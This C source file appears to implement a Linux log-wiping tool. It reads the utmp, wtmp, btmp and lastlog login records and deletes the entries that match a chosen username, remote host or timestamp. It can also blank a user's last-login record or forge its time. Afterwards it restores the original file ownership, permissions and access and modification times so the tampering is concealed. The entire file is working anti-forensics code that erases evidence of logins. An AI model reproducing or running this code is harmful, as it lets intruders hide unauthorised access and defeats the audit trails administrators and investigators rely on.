#include "core.h"

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <utmpx.h>
#include <lastlog.h>
#include <pwd.h>
#include <sys/time.h>

static const char *xtmptype2str(typeid)
{
    static char stype[20] = {};
    switch (typeid)
    {
        case EMPTY:
            return "empty";
#ifdef __USE_GNU
        case RUN_LVL:
            return "runlvl";
#endif
        case BOOT_TIME:
            return "boot";
        case LOGIN_PROCESS:
            return "login";
        case INIT_PROCESS:
            return "init";
        case USER_PROCESS:
            return "normal";
        case DEAD_PROCESS:
            return "dead";
        default:
            sprintf(stype, "%d", typeid);
            return stype;
    }
}
const char *seconds2str(time_t seconds) {
    static char timebuf[64] = {0};
    size_t pos = strftime(timebuf, sizeof(timebuf),
            TIME_FORMAT,
            localtime(&seconds) );
    if (pos == 0) {
        return NULL;
    }
    return timebuf;
}
time_t str2seconds(const char *strtime)
{
    struct tm t;
    char *pos = strptime(strtime, TIME_FORMAT, &t);
    //printf("pos = %d\n", pos - strtime);
    if (pos -strtime < 0)
        return -1;
    return mktime(&t);
}

void print_utmp_record(struct utmpx *putmp)
{

    printf(XTMP_FORMAT,
            xtmptype2str(putmp->ut_type),
            putmp->ut_user,
            putmp->ut_line,
            seconds2str(putmp->ut_tv.tv_sec),
            putmp->ut_host
            );
}
int print_xtmp(const char *filepath)
{
    int fd = open(filepath, O_RDONLY);
    if (fd < 0) {
        printf("failed to open %s: %s\n", filepath, strerror(errno));
        return -1;
    }
    struct utmpx record;
    int utmp_size = sizeof(record);
    //printf("utmp size: %d\n", utmp_size);

    printf("=== %s ===\n",filepath);
    printf(XTMP_FORMAT,
            "TYPE", "USER", "TTY", "TIME", "HOST");
    ssize_t read_size = 0;
    while(1) {
        memset(&record, 0, utmp_size);
        read_size = read(fd, &record, utmp_size);
        if (read_size > 0) {
            //printf("read_size: %zd\n", read_size);
            print_utmp_record(&record);
            continue;
        }
        else if (read_size == 0) {
            //printf("EOF\n");
            break;
        }
        else// if (read_size < 0)
            printf("failed to read %s: %s\n", filepath, strerror(errno));
            break;
    }

    close(fd);
    return 0;
}

int name2id(const char *username)
{
    errno = 0;
    struct passwd *pw = getpwnam(username);
    if (pw == NULL) {
        if (errno == 0) {
            //printf("user %s not found\n", username);
            return -1;
        } else {
            printf("getpwnam(%s) error: %s\n", username, strerror(errno));
            return -1;
        }
    }
    return pw->pw_uid;
}

void print_llog_record(const char *username, struct lastlog *pllog)
{
    const char *login_status = pllog->ll_time == 0 ?
        "NEVER_LOGIN" : seconds2str(pllog->ll_time);
    printf(LLOG_FORMAT,
            username,
            pllog->ll_line,
            pllog->ll_host,
            login_status
          );
}
int getllog_from_uid(int llogfd, int uid, struct lastlog *record)
{
    do {
        if (uid < 0)
            break;
        int llog_size = sizeof(struct lastlog);
        if (-1 == lseek(llogfd, uid * llog_size, SEEK_SET)) {
            printf("failed to lseek lastlog: %s\n", strerror(errno));
            break;
        }
        memset(record, 0, llog_size);
        ssize_t read_size = read(llogfd, record, llog_size);
        if (read_size < 0) {
            printf("failed to read lastlog: %s\n",  strerror(errno));
            break;
        } else if (read_size == 0) {
            break;
        } else {
            return 0;
        }
    }while(0);
    return -1;
}
int print_lastlog(const char *filepath, const char *username)
{
    printf("=== %s ===\n",filepath);
    int fd = open(filepath, O_RDONLY);
    if (fd < 0) {
        printf("failed to open %s: %s\n", filepath, strerror(errno));
        return -1;
    }
    printf(LLOG_FORMAT,
            "Name","Port","From","Latest");
    //if (username == NULL)
    //    return -1;
    struct lastlog llog;

    if (username == NULL) {
        // print all user record in /ect/passwd
        struct passwd *p = NULL;
        setpwent();
        while((p = getpwent()) != NULL)
        {
            if ( 0 == getllog_from_uid(fd, p->pw_uid, &llog) )
                print_llog_record(p->pw_name, &llog);
        }
        endpwent();
    } else {
        // just print for certain user
        if ( 0 == getllog_from_uid(fd, name2id(username), &llog) )
            print_llog_record(username, &llog);
    }

    close(fd);
    return 0;
}

int print_byopt(hma_option *poption)
{
    if (poption->utmp.enable) {
        print_xtmp(poption->utmp.path);
    }
    if (poption->wtmp.enable) {
        print_xtmp(poption->wtmp.path);
    }
    if (poption->btmp.enable) {
        print_xtmp(poption->btmp.path);
    }
    if (poption->lastlog.enable) {
        if (poption->name.enable)
            print_lastlog(poption->lastlog.path, poption->name.key);
        else 
            print_lastlog(poption->lastlog.path, NULL);
    }

    return 0;
}


int match_xtmp_record(struct utmpx *precord, hma_option *poption)
{
    int match = -1;
    if (poption->name.enable) {
        match = (strcmp(poption->name.key,precord->ut_user) == 0)?
            0 : -1;
    }
    if (poption->address.enable) {
        match = (strcmp(poption->address.key,precord->ut_host) == 0)?
            0 : -1;
    }
    if (poption->time.enable) {
        time_t seconds = str2seconds(poption->time.key);
        match = (seconds == precord->ut_tv.tv_sec) ? 0 : -1;
    }

    return match;
}
int restore(const char *tmpfile, const char *sourcefile)
{
    struct stat statbuf;
    memset(&statbuf, 0, sizeof(statbuf));
    if (0 != stat(sourcefile, &statbuf) ) {
        printf("failed to get stat of %s: %s\n", sourcefile, strerror(errno) );
        return -1;
    }
    printf("uid=%d,gid=%d,mode=%o,atime=%s,mtime=%s\n",
            statbuf.st_uid, statbuf.st_gid, statbuf.st_mode,
            seconds2str(statbuf.st_atime), seconds2str(statbuf.st_mtime));

    if (0 != chmod(tmpfile, statbuf.st_mode) ) {
        perror("chmod");
        return -1;
    }
    if (0 != chown(tmpfile, statbuf.st_uid, statbuf.st_gid) ) {
        perror("chown");
        return -1;
    }
    if (0 != restore_time(tmpfile, &statbuf) )
        return -1;

    if( -1 == rename(tmpfile, sourcefile) ) {
        printf("failed to copy %s -> %s, %s\n",
                tmpfile, sourcefile,
                strerror(errno));
        return -1;
    }

    return 0;

}
int restore_time(const char *filepath, struct stat *statbuf)
{
    struct timeval tv[2];
    tv[0].tv_sec = statbuf->st_atime;
    tv[0].tv_usec = statbuf->st_atimensec / 1000;
    tv[1].tv_sec = statbuf->st_mtime;
    tv[1].tv_usec = statbuf->st_mtimensec / 1000;
    if (0 != utimes(filepath, tv) ) {
        perror("utimes");
        return -1;
    }
    return 0;
}
int clear_xtmp(const char *filepath, hma_option *poption)
{
    char tmpfile[PATH_MAX];
    snprintf(tmpfile, PATH_MAX, "%s.tmp", filepath);
    printf("searching record in file %s\n",filepath);
    int sourcefd = open(filepath, O_RDONLY);
    if (sourcefd < 0) {
        printf("failed to open %s: %s\n", filepath, strerror(errno));
        return -1;
    }
    int destfd = open(tmpfile, O_RDWR | O_CREAT);
    if (destfd < 0) {
        printf("failed to create tmp file: %s\n", strerror(errno));
        close(sourcefd);
        return -1;
    }

    struct utmpx record;
    int utmp_size = sizeof(record);
    //printf("utmp size: %d\n", utmp_size);
    ssize_t read_size = 0;
    int modified = 0;
    while(1) {
        memset(&record, 0, utmp_size);
        read_size = read(sourcefd, &record, utmp_size);
        if (read_size > 0) {
            if ( 0 == match_xtmp_record(&record, poption) ) {
                print_utmp_record(&record);
                modified = 1;
            }
            else {
                write(destfd, &record, sizeof(record));
            }
            continue;
        }
        else if (read_size == 0) {
            //printf("EOF\n");
            break;
        }
        else// if (read_size < 0)
            printf("failed to read %s: %s\n", filepath, strerror(errno));
            break;
    }

    close(sourcefd);
    close(destfd);

    if (modified)
        return restore(tmpfile, filepath);
    else 
        printf("record not matched, not modifing %s\n", filepath);
    return 0;
}


int clear_lastlog(const char *filepath, hma_option *poption)
{
    int uid = name2id(poption->name.key);
    if (uid == -1) 
        return -1;
    int fd = open(filepath, O_RDWR);
    if (fd == -1) {
        printf("failed to open %s: %s\n", filepath, strerror(errno));
        return -1;
    }
    struct stat statbuf;
    memset(&statbuf, 0, sizeof(statbuf));
    if (0 != stat(filepath, &statbuf) ) {
        printf("failed to get stat of %s: %s\n", filepath, strerror(errno) );
        return -1;
    }
    struct lastlog llog;
    int llog_size = sizeof(llog);
    do {
        if ( 0 == getllog_from_uid(fd, uid, &llog) ) {
            print_llog_record(poption->name.key, &llog);
            // clear line, from, and timestamp
            memset( &llog, 0, llog_size );
            // or set custom timestamp
            if (poption->time.enable)
                llog.ll_time = str2seconds(poption->time.key);
            if (-1 == lseek(fd, uid * llog_size, SEEK_SET)) {
                perror("seek");
                break;
            }
            if (-1 == write(fd, &llog, llog_size)) {
                perror("write");
                break;
            }
        }
        else
            printf("no record for user %s in %s\n",
                    poption->name.key, filepath);
    
    }while(0);

    close(fd);
    return restore_time(filepath, &statbuf);
}

int clear_byopt(hma_option *poption)
{
    if (poption->utmp.enable)
        clear_xtmp(poption->utmp.path, poption);
    if (poption->wtmp.enable)
        clear_xtmp(poption->wtmp.path, poption);
    if (poption->btmp.enable)
        clear_xtmp(poption->btmp.path, poption);
    if (poption->lastlog.enable) {
        if (poption->name.enable)
            clear_lastlog(poption->lastlog.path, poption);
        else
            printf("you need to specify a username to clear lastlog\n");
    }
    return 0;
}
